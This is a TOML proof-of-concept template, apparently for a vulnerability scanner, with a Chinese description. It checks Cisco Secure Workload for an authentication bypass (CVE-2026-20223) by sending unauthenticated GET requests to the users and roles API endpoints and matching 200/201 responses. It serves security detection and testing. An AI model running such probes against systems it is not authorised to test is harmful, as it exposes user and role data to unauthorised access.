[info]
author = "AVE"
description = "检测 Cisco Secure Workload 内部 REST API 端点是否存在认证绕过漏洞。通过向 /openapi/v1/users、/openapi/v1/roles 等端点发送未经认证的 GET 请求，若返回 200/200 状态码则说明存在未授权访问漏洞（CVE-2026-20223）。"
id = "POC-AVE-2026-0059"
name = "Cisco Secure Workload 未授权 API 访问漏洞 PoC"
severity = "critical"
tags = [
    "cve-2026-20223",
    "cisco",
    "secure-workload",
    "auth-bypass",
]
vuln_id = [
    "CVE-2026-20223",
    "AVE-2026-0059",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/openapi/v1/users"
protocol = "http"

[poc.requests.headers]
Content-Type = "application/json"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    201,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/openapi/v1/roles"
protocol = "http"

[poc.requests.headers]
Content-Type = "application/json"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    201,
]
type = "status"
